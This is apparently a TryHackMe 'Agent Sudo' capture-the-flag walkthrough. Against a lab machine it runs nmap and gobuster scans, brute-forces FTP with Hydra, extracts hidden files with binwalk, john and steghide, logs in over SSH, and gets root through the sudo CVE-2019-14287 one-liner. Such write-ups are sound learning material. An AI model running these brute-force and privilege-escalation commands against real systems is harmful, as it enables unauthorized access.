# Agent Sudo (THM)




---

**Target:** 10.10.82.121

## **Nmap Scan**

**Command:**
```bash
nmap -vv -sS -sV -sC -oN nmap_out.txt 10.10.82.121
```

**Results:**
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

## **GoBuster Scan**

**Command:**
```bash
gobuster dir -e -u http://10.10.82.121 -w /home/iftx/Desktop/AgentSudo/wordlist/common.txt -x .php,.txt,.js,.html
```

**Result:**
```
http://10.10.82.121/index.php            (Status: 200) [Size: 218]
```

**Finding:** Change User-Agent to agent 'C'.

**Response:**
```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
From,
Agent R
```

## **Hydra Brute Force**

**Command:**
```bash
sudo hydra -l chris -P /home/iftx/Desktop/AgentSudo/wordlist/rockyou.txt 10.10.82.121 ftp
```

**Result:**
```
[21][ftp] host: 10.10.82.121   login: chris   password: crystal
```

## **FTP Access & File Download**

**Commands:**
```bash
ftp 10.10.82.121
mget *
```

**Downloaded Files:**
- To_agentJ.txt
- cute-alien.jpg
- cutie.png

## **Steganography Analysis**

### **Extracting Data from Images**

#### **Binwalk**
```bash
binwalk -e cutie.png
```
**Extracted File:** To_agentR.txt (Encrypted ZIP)

#### **Cracking ZIP Password with John the Ripper**
```bash
zip2john 8702.zip > zip_hash
john zip_hash
john zip_hash --show
```
**Password:** alien

**Message from To_agentR.txt:**
```
Agent C,
We need to send the picture to ‘QXJlYTUx’ as soon as possible!
By,
Agent R
```

**Decoding Base64:**
```bash
echo QXJlYTUx | base64 -d
```
**Decoded Value:** Area51

#### **Steghide Extraction**
```bash
steghide extract -sf cute-alien.jpg
```
**Password:** Area51

**Extracted message.txt:**
```
Hi james,
Glad you find this message. Your login password is hackerrules!
Your buddy,
chris
```

## **SSH Login**

```bash
ssh james@10.10.82.121
```
**Credentials:**
```
Username: james
Password: hackerrules
```

## **Privilege Escalation**

### **Checking Sudo Version**
```bash
sudo --version
```
**Result:** Sudo version 1.8.21p2 (CVE-2019-14287 vulnerability found)

### **Exploitation**

```bash
sudo -u#-1 /bin/bash
```

**Root Access Achieved!** ✅




